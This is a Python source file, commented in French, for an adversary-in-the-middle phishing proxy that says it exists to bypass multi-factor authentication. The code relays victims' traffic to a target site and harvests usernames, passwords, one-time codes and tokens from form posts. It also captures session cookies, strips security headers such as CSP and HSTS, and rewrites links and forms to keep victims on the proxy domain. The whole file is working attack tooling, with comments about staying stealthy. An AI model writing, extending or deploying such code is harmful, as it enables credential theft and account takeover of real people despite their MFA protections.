import aiohttp
import asyncio
from typing import Dict, Optional, Tuple
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from fastapi import Request, Response, HTTPException
from core.session.session_manager import session_manager
from urllib.parse import parse_qs

class AiTMProxy:
    """
    Adversary-in-the-Middle (AiTM) Proxy Engine v5
    Intercepte et réécrit le trafic pour contourner le MFA et capturer les sessions.
    """
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.proxy_domain = "vantablack-proxy.com" # À configurer dynamiquement
        self.session_manager = session_manager

    async def get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                auto_decompress=False # On veut gérer la décompression nous-mêmes si besoin
            )
        return self.session

    async def proxy_request(self, target_url: str, request: Request, session_id: str = None, body: bytes = None) -> Response:
        """
        Proxy la requête vers le serveur cible et réécrit la réponse.
        """
        session = await self.get_session()
        
        # Capture Credentials (POST)
        if request.method == "POST" and session_id and body:
            self._capture_credentials(session_id, body)

        # Nettoyage des headers (suppression de l'hôte d'origine, compression, etc.)
        headers = dict(request.headers)
        headers.pop("host", None)
        headers.pop("content-length", None)
        headers["user-agent"] = headers.get("user-agent", "Mozilla/5.0") # Fail-safe
        
        method = request.method
        cookies = request.cookies
        
        try:
            async with session.request(
                method, 
                target_url, 
                headers=headers, 
                data=body, 
                cookies=cookies,
                allow_redirects=False # On gère les redirections manuellement
            ) as upstream_response:
                
                content = await upstream_response.read()
                response_headers = dict(upstream_response.headers)
                
                # Capture Cookies (Set-Cookie)
                if session_id and "set-cookie" in response_headers:
                    # Note: aiohttp combine les headers multiples, il faudrait parser proprement
                    # Pour l'instant on capture tout le bloc
                    self.session_manager.capture_cookies(session_id, {"raw_cookie": response_headers["set-cookie"]})
                
                # Suppression des headers de sécurité qui bloqueraient le framing/proxying
                for h in ["content-security-policy", "x-frame-options", "strict-transport-security"]:
                    response_headers.pop(h, None)
                
                # Réécriture du contenu si c'est du HTML/Texte
                content_type = response_headers.get("content-type", "")
                if "text/html" in content_type:
                    content = self.rewrite_html(content, target_url)
                    # Mise à jour content-length après réécriture
                    response_headers.pop("content-length", None)
                    # response_headers["content-length"] = str(len(content)) # Pas obligatoire avec chunked
                
                return Response(
                    content=content,
                    status_code=upstream_response.status,
                    headers=response_headers,
                    media_type=content_type
                )
                
        except Exception as e:
            # En prod, logger l'erreur discrètement
            print(f"[AiTM Error] {e}")
            raise HTTPException(status_code=502, detail="Upstream Error")

    def _capture_credentials(self, session_id: str, body: bytes):
        """
        Analyse le corps de la requête pour extraire les identifiants.
        """
        try:
            # Tentative de parsing form-urlencoded
            decoded = body.decode('utf-8', errors='ignore')
            parsed = parse_qs(decoded)
            
            # Mots clés à surveiller
            sensitive_keys = ["user", "username", "login", "email", "password", "pass", "pwd", "otp", "code", "token"]
            
            captured = {}
            for key, values in parsed.items():
                if any(s in key.lower() for s in sensitive_keys):
                    captured[key] = values[0] if values else ""
            
            if captured:
                print(f"[AiTM] Credentials captured for session {session_id}: {captured}")
                for k, v in captured.items():
                    self.session_manager.capture_credential(session_id, k, v)
                    
        except Exception as e:
            print(f"[AiTM Warning] Failed to parse POST body: {e}")

    def rewrite_html(self, html_content: bytes, base_url: str) -> bytes:
        """
        Réécrit les liens et formulaires pour qu'ils pointent vers le proxy.
        """
        try:
            soup = BeautifulSoup(html_content, "html.parser")
            
            # Réécriture des liens (a href)
            for tag in soup.find_all("a", href=True):
                tag["href"] = self._rewrite_url(tag["href"], base_url)
                
            # Réécriture des formulaires (form action)
            for tag in soup.find_all("form", action=True):
                tag["action"] = self._rewrite_url(tag["action"], base_url)
                
            # Réécriture des ressources statiques (img src, script src, link href)
            # Pour l'instant on laisse les statiques pointer vers l'original pour alléger la charge
            # Sauf si on veut éviter le mixed content ou les fuites de referrer
            
            return str(soup).encode("utf-8")
        except Exception:
            return html_content

    def _rewrite_url(self, url: str, base_url: str) -> str:
        """
        Transforme une URL cible en URL proxy.
        """
        # Si lien absolu vers le domaine cible -> remplacer par notre domaine
        full_url = urljoin(base_url, url)
        parsed = urlparse(full_url)
        
        # Logique simplifiée : tout passe par /proxy?url=... ou via sous-domaine
        # Pour V5, on utilisera une approche plus furtive (mapping de routes)
        # Ici on retourne le chemin relatif pour rester sur le proxy
        return parsed.path + ("?" + parsed.query if parsed.query else "")

    async def close(self):
        if self.session:
            await self.session.close()

# Instance globale
aitm_proxy = AiTMProxy()
